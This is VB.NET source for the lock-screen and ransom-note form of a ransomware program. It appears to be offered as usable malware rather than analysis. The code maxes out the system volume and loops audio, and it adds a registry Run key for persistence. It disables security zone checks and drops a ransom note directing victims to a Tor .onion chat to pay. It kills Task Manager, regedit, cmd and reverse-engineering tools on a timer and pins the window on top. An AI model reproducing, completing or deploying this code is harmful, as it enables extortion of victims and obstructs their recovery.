Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text

Public Class Warning

    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

    Const WM_APPCOMMAND As UInteger = &H319
    Const APPCOMMAND_VOLUME_UP As UInteger = &HA

    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Private Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As UInteger, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function

    Private Sub Middleman_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.Show()
        Me.Visible = True
        Me.Focus()

        Try
            For a = 100 To 1 Step -1
                SendMessage(Me.Handle, WM_APPCOMMAND, &H30292, APPCOMMAND_VOLUME_UP * &H10000)
            Next
        Catch ex As Exception
        End Try

        Try
            Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
        Catch ex As Exception
        End Try

        Try
            My.Computer.Audio.Play(My.Resources.major, AudioPlayMode.BackgroundLoop)
        Catch ex As Exception

        End Try

        Try
            Dim regKey As Microsoft.Win32.RegistryKey
            regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
            regKey.SetValue("AlertaRansom", Application.ExecutablePath & " -alerta")
        Catch ex As Exception
        End Try


        Try
            Dim filePath = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "KageNoHitobito_ReadMe.txt")
            Try
                IO.File.WriteAllText(filePath, "All your important files and documents have been encrypted by us.

Step 1: 
On your current desktop, open up your default browser.
Search for Tor Browser or visit https://www.torproject.org/
If you cannot access Tor then use a VPN to get it instead.
Then download to the Tor Browser and follow Step 2.

Step 2:
Navigate to the group chat and select 'Hitobito' from the username list.
Message with your situation and the price you are willing to pay for your files.
http://notbumpz34bgbz4yfdigxvd6vzwtxc3zpt5imukgl6bvip2nikdmdaad.onion/chat/
If you do not know how to private messasge, ask the chat, they are usually friendly.
Though we advise you not to click links or follow any discussion they talk of.

Step 3: This is the important part, the one where you restore your computer quickly.
If you negotiate correctly and pay our ransom, we will send you a decryptor.
Reminder that 'Hitobito' can be impersonated or be one of several group members.")
            Catch ex As Exception

            End Try
        Catch ex As Exception

        End Try
    End Sub

    Private Function ComputeHash(input As String) As String
        Using sha256Hash As SHA256 = SHA256.Create()
            Dim bytes As Byte() = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(input))

            Dim builder As New StringBuilder()
            For i As Integer = 0 To bytes.Length - 1
                builder.Append(bytes(i).ToString("x2"))
            Next
            Return builder.ToString()
        End Using
    End Function

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Dim enteredPasswordHash As String = ComputeHash(TextBox1.Text)


        If enteredPasswordHash = "008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601" Then ' Replace this hash with the hash of your actual password
            MsgBox("Correct key entered.

Please wait until the sound stops and your system will of been decrypted!", vbInformation, "Hitobito")
            Me.Hide()
            Form2.Show()
        Else
            TextBox1.Text = ""
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Management.TerminateProcessByName("taskmgr")
            Management.TerminateProcessByName("regedit")
            Management.TerminateProcessByName("cmd")
            Management.TerminateProcessByName("sndvol")
            Management.TerminateProcessByName("processhacker")
            Management.TerminateProcessByName("procexp")
            Management.TerminateProcessByName("procexp64")
            Management.TerminateProcessByName("autoruns64")
            Management.TerminateProcessByName("autoruns")
            Management.TerminateProcessByName("dnspy")
            Management.TerminateProcessByName("ilspy")
            Management.TerminateProcessByName("ildasm")
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        SetWindowPos(Me.Handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE Or SWP_NOSIZE)
    End Sub

    Private Const HWND_TOPMOST As Integer = -1
    Private Const SWP_NOMOVE As Integer = &H2
    Private Const SWP_NOSIZE As Integer = &H1

    <DllImport("user32.dll")>
    Private Shared Function SetWindowPos(hWnd As IntPtr, hWndInsertAfter As Integer, X As Integer, Y As Integer, cx As Integer, cy As Integer, uFlags As Integer) As Boolean
    End Function

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Clipboard.SetText("http://notbumpz34bgbz4yfdigxvd6vzwtxc3zpt5imukgl6bvip2nikdmdaad.onion/chat/")
        Catch clipboard As Exception
        End Try
    End Sub
End Class